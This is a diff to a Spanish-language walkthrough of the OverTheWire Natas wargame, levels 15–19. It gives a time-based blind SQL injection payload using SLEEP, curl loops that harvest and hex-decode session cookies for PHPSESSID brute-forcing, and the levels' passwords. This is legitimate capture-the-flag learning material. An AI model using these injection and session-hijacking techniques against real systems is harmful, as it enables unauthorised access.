@@ -213,7 +213,7 @@ Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
 
 Blind SQL injection. Toca hacer fuerza bruta, mejor con python.
 
-Hago una ñapa con un script en dos pasadas. En la primera, miro qué caracteres hay mediante una consile like %char%:
+Hago una ñapa con un script en dos pasadas. En la primera, miro qué caracteres hay mediante una consulta like %char%:
 
 ```
 #!/usr/bin/env python
@@ -313,4 +313,75 @@ Completo sería:
 
 ¿Por qué se añade injections? Porque si el resultado de $() es nulo, seguirá apareciendo injections como resultado final. Sin embargo, si $() encuentra algo, el resultado final será nulo (porque no hay ningún "prefijo" que añadido a injections de resultado)
 
-A partir de ahí, hay que crear un script similar al del caso anteior.
+A partir de ahí, hay que crear un script similar al del caso anterior.
+
+El resultado es 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+# natas17
+
+http://natas17.natas.labs.overthewire.org/
+
+De nuevo blind injection, esta vez con MySQL. Dado que la url no tiene salida en ningún caso (ver source), habrá que optar de nuevo por la fuerza bruta concatenando un IF ... SLEEP en cada caso. Habrá que tener cuidado con el tiempo de SLEEP, logrando un balance entre que no tarde demasiado tiempo y que no haya errores por lentitud de respuesta.
+
+Ejemplo de parámetro POST:
+
+natas18" and if(1=1, sleep(3), null) #
+natas18%22+and+if%281%3D1%2C+sleep%283%29%2C+null%29+%23
+
+Posiblemente debemos usar LIKE y hacer dos pasadas, como en los casos anteriores:
+
+1. La primera para determinar el juego de caracteres
+
+2. La segunda para sacar la contraseña
+
+Así que usaremos de nuevo un script en python (bruta3.py)
+
+Después de unos minutos se obtiene este resultado:
+
+* natas18 : xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+
+# natas18
+
+Este lo hago de nuevo por fuerza bruta. Sin terminar de analizarlo en detalle, parece que lo único que podemos manupular es la cookie PHPSESSID y que está limitada a un rango de valores bajo, así que...
+
+Ejecuto `bruta4.py`
+
+natas19 : 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+
+# natas19
+
+Aparentemente similar, pero parece que ya no puede usarse directamente PHPSESSID.
+
+Vamos a ver cómo se genera haciendo unas cuantas llamadas:
+
+```
+while true; do curl -s -c - -I -u natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs 'http://natas19.natas.labs.overthewire.org?debug&username=admin&password=asdf'|awk '/Set-Cookie/ {print $2}'|awk -F= '{sub(/;/,""); print $2}'; done
+3534362d61646d696e
+3433342d61646d696e
+3438372d61646d696e
+3534382d61646d696e
+3336382d61646d696e
+3532322d61646d696e
+31392d61646d696e
+31332d61646d696e
+38312d61646d696e
+```
+
+El contenido de la cookie tiene toda la pinta de ser ASCII en hexadecimal. Lo decodificamos y... ¡sorpresa!
+
+```
+while true; do curl -s -c - -I -u natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs 'http://natas19.natas.labs.overthewire.org?debug&username=admin&password=asdf'|awk '/Set-Cookie/ {print $2}'|awk -F= '{sub(/;/,""); print $2}'|xxd -r -p; echo; done
+494-admin
+160-admin
+616-admin
+162-admin
+475-admin
+15-admin
+412-admin
+443-admin
+542-admin
+```
+
+Basta pues con alterar ligeramente el script python del caso anterior para obtener las credenciales buscadas:
+
+natas20 : 
